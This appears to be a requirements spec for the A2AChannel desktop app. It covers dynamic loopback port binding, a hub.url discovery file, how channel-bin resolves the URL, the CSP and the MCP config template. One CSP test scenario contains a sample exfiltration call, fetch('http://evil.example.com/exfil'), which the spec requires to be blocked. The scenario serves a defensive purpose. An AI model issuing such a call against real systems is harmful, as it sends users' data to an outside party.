## ADDED Requirements

### Requirement: Hub binds an OS-assigned free port at startup

The Rust shell SHALL bind a listener on `127.0.0.1:0` at startup, read the OS-assigned port number, release the listener, and pass the port to the `hub-bin` sidecar via the `PORT` environment variable. The `hub-bin` sidecar SHALL bind that port when starting its HTTP server. The chosen port SHALL NOT be hardcoded anywhere in the codebase.

#### Scenario: Fresh startup on a machine with no port conflict

- **WHEN** the user launches `A2AChannel.app`
- **THEN** the Rust shell binds `127.0.0.1:0`, obtains a free port (e.g. `54831`)
- **AND** releases its listener
- **AND** spawns `hub-bin` with `PORT=54831` in its environment
- **AND** `hub-bin` logs `[hub] listening on http://127.0.0.1:54831`

#### Scenario: Port 8011 is already held by an unrelated process

- **WHEN** another process is listening on `127.0.0.1:8011`
- **AND** the user launches `A2AChannel.app`
- **THEN** the app obtains a different free port (any port ≠ 8011) and starts normally
- **AND** no `EADDRINUSE` error is written to `hub.log`

### Requirement: Hub URL is published to a discovery file

On successful hub startup, the Rust shell SHALL write the hub URL to `~/Library/Application Support/A2AChannel/hub.url`. The file SHALL contain exactly the URL (e.g. `http://127.0.0.1:54831`), optionally terminated by a newline. The parent directory SHALL be created if it does not exist. The write SHALL be atomic: the Rust shell SHALL write to a temporary file in the same directory and rename it over the target.

#### Scenario: Discovery file is written on first launch

- **WHEN** the app starts for the first time on a machine
- **AND** `~/Library/Application Support/A2AChannel/` does not yet exist
- **THEN** the directory is created
- **AND** `hub.url` is written with content matching the hub's actual URL

#### Scenario: Discovery file is replaced atomically on restart

- **GIVEN** a previous run left `hub.url` containing `http://127.0.0.1:54831`
- **WHEN** the app starts again and obtains port `62144`
- **THEN** `hub.url` is updated atomically (rename-into-place)
- **AND** any reader observes either the full old content or the full new content, never partial

### Requirement: UI obtains hub URL via Tauri command

The Rust shell SHALL expose a Tauri command named `get_hub_url` that returns the current hub URL as a string. The webview SHALL invoke this command at startup before opening any SSE or HTTP connection to the hub. The hardcoded `BUS` constant SHALL be replaced with a value obtained from this command.

#### Scenario: Webview bootstrap fetches the URL

- **WHEN** the webview loads `index.html`
- **THEN** the first network activity to the hub is preceded by `invoke('get_hub_url')`
- **AND** that call returns a string matching `http://127.0.0.1:<port>` where `<port>` matches the port in the discovery file

### Requirement: channel-bin discovers the hub URL without configuration

The `channel-bin` process SHALL determine the hub URL using the following priority order:

1. If the `CHATBRIDGE_HUB` environment variable is set and non-empty, use it verbatim.
2. Otherwise, read `~/Library/Application Support/A2AChannel/hub.url` and use its contents (trimmed of whitespace).
3. Otherwise (file missing, empty, or unreadable), treat as connection failure and apply the existing backoff-and-retry loop.

On connection failure, `channel-bin` SHALL re-run the resolution (priority 1 or 2) on each retry attempt so that stale URLs self-heal once the app restarts.

#### Scenario: channel-bin with no env var finds the running hub

- **GIVEN** `A2AChannel.app` is running and has written `hub.url`
- **AND** a Claude Code session starts with `.mcp.json` that does not set `CHATBRIDGE_HUB`
- **WHEN** `channel-bin` starts
- **THEN** it reads `hub.url`, connects to that URL, and registers the agent

#### Scenario: channel-bin started before the app converges once the app starts

- **GIVEN** a Claude Code session started `channel-bin` with no `CHATBRIDGE_HUB` env
- **AND** `A2AChannel.app` was not running at that moment
- **WHEN** the app is launched 30 seconds later
- **THEN** `channel-bin`'s next retry (within its 2-second backoff interval) reads the now-present `hub.url`
- **AND** connects successfully
- **AND** the UI displays the agent's pill as online

#### Scenario: Stale discovery file from a crashed previous run

- **GIVEN** `hub.url` contains `http://127.0.0.1:54831` from a previous run that crashed
- **AND** no process is listening on that port
- **AND** `channel-bin` is running with cached URL `http://127.0.0.1:54831`
- **WHEN** the app is relaunched and obtains port `60112`, overwriting `hub.url`
- **THEN** `channel-bin`'s current connection attempt fails with `ECONNREFUSED`
- **AND** its retry re-reads `hub.url`
- **AND** connects to `http://127.0.0.1:60112`

#### Scenario: Explicit CHATBRIDGE_HUB overrides discovery

- **GIVEN** `.mcp.json` sets `CHATBRIDGE_HUB=http://127.0.0.1:9999`
- **WHEN** `channel-bin` starts
- **THEN** it connects to `http://127.0.0.1:9999` regardless of the contents of `hub.url`

### Requirement: CSP permits any local-loopback port

The app's Content-Security-Policy SHALL permit `connect-src` and `img-src` directives to include `http://127.0.0.1:*` (any port on loopback). The CSP SHALL continue to deny non-loopback origins.

#### Scenario: Webview connects to the dynamically-assigned port

- **GIVEN** the hub is listening on `http://127.0.0.1:54831`
- **WHEN** the webview issues `fetch('http://127.0.0.1:54831/agents')`
- **THEN** the request is not blocked by CSP

#### Scenario: CSP still blocks non-loopback origins

- **GIVEN** an attacker-controlled script (hypothetically) runs in the webview
- **WHEN** it attempts `fetch('http://evil.example.com/exfil')`
- **THEN** the request is blocked by CSP

### Requirement: MCP config template omits hub URL

The `get_mcp_template` Rust command SHALL return JSON that does not contain a `CHATBRIDGE_HUB` env entry. The `env` block SHALL contain only `CHATBRIDGE_AGENT`. Users who paste this template into a `.mcp.json` SHALL obtain a working config without any URL configuration.

#### Scenario: Modal shows env block with only CHATBRIDGE_AGENT

- **WHEN** the user clicks "MCP configs" in the app header
- **THEN** the modal textarea content parses as valid JSON
- **AND** the `mcpServers.chatbridge.env` object has exactly one key: `CHATBRIDGE_AGENT`
